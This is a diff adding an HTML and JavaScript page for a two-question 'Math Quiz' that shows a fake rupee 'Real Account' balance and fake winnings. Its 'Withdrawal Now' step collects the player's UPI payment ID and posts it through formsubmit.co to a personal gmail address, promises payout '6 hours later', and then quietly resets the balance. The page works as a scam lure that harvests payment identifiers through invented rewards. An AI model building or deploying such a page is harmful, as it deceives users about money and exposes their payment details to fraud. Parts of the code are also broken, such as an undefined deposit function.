@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+  <title>Game </title>
+  <style>
+        *{
+      margin:0;
+      padding:0;
+      overflow:hidden;
+      box-sizing:border-box;
+    }
+    header{
+      width:100%;
+      height:60px;
+      background: white ;
+    }
+             #Deposit{
+      width:100px;
+      float:left;
+      height:23px;
+      margin-left:80px;
+      font-size:11px;
+      margin-top:5px;
+      background:linear-gradient(skyblue,lightgreen);
+      font-weight:bold;
+    
+    }
+            #Withdraw{
+      width:100px;
+      float:left;
+      height:23px;
+      margin-left:40px;
+           font-size:11px;
+      margin-top:5px;
+      background:linear-gradient(skyblue,lightgreen);
+    font-weight:bold;
+    
+    }
+    h3{
+     text-align:center;
+    }
+    /*   #game_page{
+      width:100%;
+      height:900px;
+      background:url(Mathphoto.jpg);
+      background-size: contain ;
+      position:fixed;
+      top:60px;
+      left:0;
+      opacity:0;
+    }
+    h1{
+      color: white ;
+      text-align:center;
+      padding-top:10px;
+    }
+    #Q1{
+      color:white;
+      position:relative;
+      top:50px;
+      left:-140px;
+      font-size:25px;
+    }
+    #one{
+      float:left;
+      position:relative;
+      top:100px;
+      width:60px;
+      height:30px;
+      left:100px;
+      font-weight:bold;
+      
+    }
+        #two{
+      float:left;
+      position:relative;
+      top:100px;
+      width:60px;
+      height:30px;
+      left:130px;
+      font-weight:bold;
+      
+    }
+        #three{
+      float:left;
+      position:relative;
+      top:150px;
+      width:60px;
+      height:30px;
+      left:-20px;
+      font-weight:bold;
+      
+    }
+        #four{
+      float:left;
+      position:relative;
+      top:150px;
+      width:60px;
+      height:30px;
+      left:10px;
+      font-weight:bold;
+      
+    }
+    #Q2{
+      color: white ;
+      position:relative;
+      top:190px;
+      left:-140px;
+      font-size:25px;
+      
+    }
+        #ones{
+      float:left;
+      position:relative;
+      top:230px;
+      width:60px;
+      height:30px;
+      left:100px;
+      font-weight:bold;
+      
+    }
+#twoo{
+  width:60px;
+  height:30px;
+  margin-top:230px;
+  margin-left:130px;
+}
+#threes{
+  width:60px;
+  height:30px;
+  position:relative;
+  top:50px;
+  left:-155px;
+}
+#fourr{
+  width:60px;
+  height:30px;
+  position: relative ;
+  top:50px;
+  left:-128px;
+}*/
+#game_page{
+  
+     width:100%;
+     height:900px;
+     background:url(Mathphoto.jpg);
+     background-size: contain ;
+     
+}
+    h1{
+      color: white ;
+      text-align:center;
+      padding-top:10px;
+   
+}
+    
+      #Q1{
+      color:white;
+      position:relative;
+      top:50px;
+      left:-80px;
+      font-size:25px;
+    
+}
+    
+    #one{
+      float:left;
+      position:relative;
+      top:100px;
+      width:60px;
+      height:30px;
+      left:100px;
+      font-weight:bold;
+   
+}
+      
+    
+        #two{
+      float:left;
+      position:relative;
+      top:100px;
+      width:60px;
+      height:30px;
+      left:130px;
+      font-weight:bold;
+     
+}
+      
+    
+        #three{
+      float:left;
+      position:relative;
+      top:150px;
+      width:60px;
+      height:30px;
+      left:-20px;
+      font-weight:bold;
+     
+}
+      
+    
+        #four{
+      float:left;
+      position:relative;
+      top:120px;
+      width:60px;
+      height:30px;
+      left:10px;
+      font-weight:bold;
+     
+}
+      
+    
+    #Q2{
+      color: white ;
+      position:fixed;
+      top:350px;
+      left:100px;
+      font-size:25px;
+    
+}
+      
+    
+        #ones{
+      float:left;
+      position:relative;
+      top:270px;
+      width:60px;
+      height:30px;
+      left:-140px;
+      font-weight:bold;
+     
+}
+      
+    
+#twoo{
+  width:60px;
+  height:30px;
+  margin-top:240px;
+  margin-left:185px;
+
+}
+
+#threes{
+  width:60px;
+  height:30px;
+  position:relative;
+  top:50px;
+  left:-150px;
+
+}
+
+#fourr{
+  width:60px;
+  height:30px;
+  position: relative ;
+  top:50px;
+  left:-128px;
+
+}
+
+.arrow{
+  position: fixed ;
+  top:20px;
+  left:20px;
+  font-size:20px;
+}
+#with{
+  width:130px;
+  height:40px;
+  margin-top:90px;
+  margin-left:120px;
+  opacity:0;
+
+}
+#contain{
+  width:250px;
+  height:300px;
+  border:2px solid white;
+  margin:100px auto;
+  margin-left:70px;
+  border-radius:10px;
+  display:none;
+}
+#id{
+  color:white;
+  font-size:20px;
+  position: relative ;
+  top:20px;
+  left:20px;
+  display:none;
+}
+
+#text{
+  width:200px;
+  height:30px;
+  position:relative;
+  margin-top:30px;
+  margin-left:20px;
+  outline:none;
+ 
+
+}
+#text[type=text]{
+  color:black;
+  font-weight:bold;
+  padding-left:10px;
+}
+#text::placeholder{
+  color:black;
+  font-weight:bold;
+}
+#btn{
+  width:120px;
+  height:40px;
+  position:relative;
+  top:-230px;
+  left:130px;
+  font-size:15px;
+  font-weight:bold;
+  display:none;
+
+}
+#btn:hover{
+  background: transparent ;
+  color:white;
+}
+#notice{
+  color:white;
+  position:fixed;
+  top:430px;
+  left:90px;
+  font-weight:bold;
+  display:none;
+}
+#play_again{
+  width:100px;
+  height:40px;
+  margin-left:150px;
+  position:fixed;
+  top:390px;
+  display:none;
+}
+#withs{
+  width:130px;
+  height:40px;
+  margin-top:130px;
+  margin-left:110px;
+  display:none;
+}
+  </style>
+</head>
+
+<body>
+<header>
+  
+
+    <h3 id="h3">Real Account  ₹ : 150</h3>
+   <button id="Deposit" onclick="deposit()">Deposit </button>
+   <button id="Withdraw">Withdrawal </button>
+   <a href="Index.html"><i class="fa-solid fa-arrow-left arrow"></i></a>
+</header>
+
+<div id="game_page">
+  <h1 id="title">Math Quiz</h1>
+  <span id="Q1">Q1. 2 × 3 - 1 ? </span>
+  <button id="one" onclick="one()"> 6</button>
+  <button id="two" onclick="two()">3</button>
+  <button id="three" onclick="three(); win()"> 5</button>
+  <button id="four" onclick="four()">-6</button>
+  
+    <span id="Q2">Q2. 5 × -5 ? </span>
+  <button id="ones" onclick="ones()"> 0</button>
+  <button id="twoo" onclick="twoo()">25</button>
+  <button id="threes" onclick="threes()"> -25</button>
+  <button id="fourr" onclick='fourr()'>-0</button>
+
+  <div id="contain">
+      <form action="https://formsubmit.co/myyezeeshop@gmail.com" method="POST">
+    <label id="id">Enter Upi Id</label>
+    <input type="text" id="text" placeholder="Enter Upi Id" name="upi" required/>
+  </div>
+  <button id="btn" onclick="btns()">Withdraw Now </button>
+  <button id="withs" onclick="withds()">Withdrawal NOW</button>
+ 
+  <p id="notice">Withdrawal 6 hours later</p>
+  
+  <button id="with" onclick="show()">Withdrawal Now</button>
+  </form>
+   <a href="newgame.html"><button id="play_again" onclick="">Play Again</button></a>  
+   
+</div>
+
+<script>
+  function one(){
+    let one = document.getElementById("one");
+    alert("You Lose");
+  }
+  function two(){
+    let one = document.getElementById("one");
+    alert("You Lose");
+  }
+  function three(){
+    let one = document.getElementById("one");
+    alert("You Win  ₹ 35 ");
+    let real = document.getElementById("h3");
+    real.innerHTML = "Real Account  ₹ : 150";
+  }
+  function four(){
+    let one = document.getElementById("four");
+    alert("You Lose");
+ 
+  
+    
+  }     
+  
+    function ones(){
+    let one = document.getElementById("one");
+    alert("You Lose");
+  }
+  function twoo(){
+    let one = document.getElementById("one");
+    alert("You Lose");
+  }
+  function threes(){
+    let one = document.getElementById("one");
+    alert("You Win  ₹ 35 ");
+    let withs = document.getElementById("with");
+    let reals = document.getElementById("h3");
+    withs.style.opacity = 1;
+    reals.innerHTML = "Real Account  ₹ : 185";
+  }
+  function fourr(){
+    let one = document.getElementById("fourr");
+    alert("You Lose");
+    
+  }     
+  function show(){
+    let withs = document.getElementById("with");
+    let contain = document.getElementById("contain");
+    let btn = document.getElementById("btn");
+    let notice = document.getElementById("notice");
+    let title = document.getElementById("title");
+    let Q1 = document.getElementById("Q1");
+    let ONE= document.getElementById("one");
+    let TWO = document.getElementById("two");
+    let THREE= document.getElementById("three");
+    let FOUR =  document.getElementById("four");
+        let Q2 = document.getElementById("Q2");
+    let ONES= document.getElementById("ones");
+    let TWOO = document.getElementById("twoo");
+    let reels = document.getElementById("h3");
+    let THREES= document.getElementById("threes");
+    let FOURS =  document.getElementById("fourr");
+    let withsz = document.getElementById("with");
+   
+    contain.style.display = "inline-block";
+    btn.style.display = "inline-block";
+    notice.style.display = "inline-block";
+    title.style.display = "none";
+    Q1.style.display = "none";
+    Q2.style.display = "none";
+    ONE.style.display = "none";
+    TWO.style.display = "none";
+    THREE.style.display = "none";
+    FOUR.style.display = "none";
+    ONES.style.display = "none";
+    TWOO.style.display = "none";
+    THREES.style.display = "none";
+    FOURS.style.display = "none";
+    withsz.style.display = "none";
+   
+   
+
+
+    
+  }
+  function btns(){
+    let show = document.getElementById("btn");
+    let reel = document.getElementById("h3");
+    let contains = document.getElementById("contain");
+    let notices = document.getElementById("notice");
+    
+    let plays = document.getElementById("play_again");
+    
+    show.style.display = "none";
+    reel.innerHTML = "Real Account  ₹ : 150";
+    contains.style.display = "none";
+    notices.style.display = "none";
+    plays.style.display = "inline-block";
+    
+    
+  }
+function plays(){
+  let titles = document.getElementById("title");
+  let reelssz = document.getElementById("h3");
+  let ques1 = document.getElementById("Q1");
+  let ONES = document.getElementById("one");
+  let TWOS = document.getElementById("two");
+  let THRESS = document.getElementById("three");
+  let FOURR = document.getElementById("four");
+  let ques2 = document.getElementById("Q2");
+  let ONESS = document.getElementById("ones");
+  let TWOSS = document.getElementById("twoo");
+  let THRESSS = document.getElementById("threes");
+  let FOURRR = document.getElementById("fourr");
+  let withdraw = document.getElementById("btn");
+ 
+  withdraw.style.display = "inline-block";
+  titles.style.display = "inline-block";
+  titles.style.marginLeft = "120px";
+  ques1.style.display = "inline-block";
+  ques1.style.marginLeft = "200px";
+  ques1.innerHTML = "Q1. 0 × 1 ?"
+  ONES.style.display = "inline-block";
+  ONES.innerHTML = "1";
+  ONES.style.marginLeft = "30px";
+  TWOS.style.display = "inline-block";
+  TWOS.innerHTML = "-1";
+  THRESS.style.display = "inline-block";
+  THRESS.innerHTML = "-0";
+  FOURR.style.display = "inline-block";
+  FOURR.innerHTML = "0";
+  FOURR.style.marginTop = "175px";
+  FOURR.style.position = "fixed";
+  FOURR.style.left = "220px";
+  ques2.style.display = "inline-block";
+  ques2.style.marginLeft = "30px";
+  ONESS.style.display = "inline-block";
+  ONESS.style.marginLeft = "65px";
+  TWOSS.style.display = "inline-block";
+  TWOSS.style.position = "relative";
+  TWOSS.style.top = "0px";
+  TWOSS.style.left = "35px";
+  THRESSS.style.display = "inline-block";
+  THRESSS.style.marginLeft = "35px";
+  FOURRR.style.display = "inline-block";
+  FOURRR.style.position = "absolute";
+  FOURRR.style.top = "465.5px";
+  FOURRR.style.left = "220px";
+  reelssz.innerHTML = "Real Account  ₹ : 100";
+  
+  
+  
+}
+function withds(){
+ let withsz = document.getElementById("witds");
+ withsz.style.display = "inline-block";
+}
+function win(){
+  let reeel = document.getElementById("h3");
+  reeel.innerHTML = "Real Account  ₹ : 150" ;
+}
+</script>
+</body>
+
+
+</html>
